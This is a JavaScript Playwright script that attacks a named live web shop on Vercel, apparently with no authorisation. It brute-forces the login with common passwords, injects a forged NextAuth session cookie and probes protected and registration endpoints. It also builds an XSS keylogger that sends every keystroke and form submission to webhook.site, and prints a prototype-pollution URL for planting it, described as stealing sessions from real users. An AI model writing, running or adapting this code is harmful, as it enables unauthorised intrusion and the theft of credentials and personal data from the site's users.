const { chromium } = require('playwright');

(async () => {
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Navigate to site first
    await page.goto('https://sturdy-octo-memory-three.vercel.app');
    await page.waitForTimeout(2000);
    
    console.log("=== TESTING BYPASS VECTORS ===\n");
    
    // Get CSRF token via API
    const csrfRes = await page.evaluate(async () => {
        const r = await fetch('/api/auth/csrf');
        return await r.json();
    });
    console.log("CSRF Token:", csrfRes.csrfToken);
    
    // TEST 1: Try all passwords again with fresh session
    console.log("\n[1] Password attempts with fresh session...");
    const passwords = ['admin', 'password', '123456', 'test', 'shop', 'demo', 'root', 'pass'];
    
    for (const pwd of passwords) {
        const result = await page.evaluate(async (data) => {
            const res = await fetch('/api/auth/callback/credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `password=${data.pwd}&redirect=false&csrfToken=${data.csrf}&callbackUrl=${encodeURIComponent(window.location.origin)}&json=true`
            });
            return { status: res.status, body: await res.text() };
        }, { pwd, csrf: csrfRes.csrfToken });
        
        let parsed;
        try {
            parsed = JSON.parse(result.body);
        } catch (e) {
            parsed = { url: result.body };
        }
        if (parsed.url && !parsed.url.includes('error')) {
            console.log(`\n[!!!] SUCCESS: ${pwd} -> ${parsed.url}`);
            break;
        }
        process.stdout.write(".");
    }
    
    // TEST 2: Cookie injection
    console.log("\n\n[2] Testing cookie injection...");
    await context.addCookies([
        { name: 'next-auth.session-token', value: 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIn0.abc123', domain: 'sturdy-octo-memory-three.vercel.app', path: '/' }
    ]);
    
    const session = await page.evaluate(async () => {
        const r = await fetch('/api/auth/session');
        return await r.json();
    });
    console.log("Session after injection:", JSON.stringify(session));
    
    // TEST 3: Try to access protected endpoints
    console.log("\n[3] Testing protected endpoints...");
    const endpoints = ['/api/users', '/api/products', '/dashboard', '/'];
    
    for (const ep of endpoints) {
        const result = await page.evaluate(async (url) => {
            const r = await fetch(url);
            return { status: r.status, body: (await r.text()).substring(0, 200) };
        }, ep);
        console.log(`${ep}: ${result.status}`);
    }
    
    // TEST 4: Check if we can create account
    console.log("\n[4] Testing account creation...");
    const registerEndpoints = ['/api/auth/register', '/register', '/api/users/create'];
    
    for (const ep of registerEndpoints) {
        const result = await page.evaluate(async (url) => {
            try {
                const r = await fetch(url, { method: 'POST', body: '{}' });
                return { status: r.status, body: (await r.text()).substring(0, 200) };
            } catch (e) {
                return { error: e.message };
            }
        }, ep);
        console.log(`${ep}: ${result.status || result.error}`);
    }
    
    // TEST 5: Use XSS to steal session from real user
    console.log("\n[5] XSS Keylogger deployment test...");
    const xssPayload = `
        // Keylogger that captures all input
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('input', (e) => {
                fetch('https://webhook.site/test?key=' + e.target.value);
            });
        });
        // Also capture form submissions
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => {
                const formData = new FormData(form);
                fetch('https://webhook.site/test?form=' + JSON.stringify(Object.fromEntries(formData)));
            });
        });
    `;
    
    console.log("XSS payload ready. To deploy:");
    const targetUrl = 'https://sturdy-octo-memory-three.vercel.app';
    console.log(`URL: ${targetUrl}?__proto__[children]=encodeURIComponent('${encodeURIComponent(xssPayload)}')`);
    
    await browser.close();
    console.log("\n=== TESTS COMPLETE ===");
})();
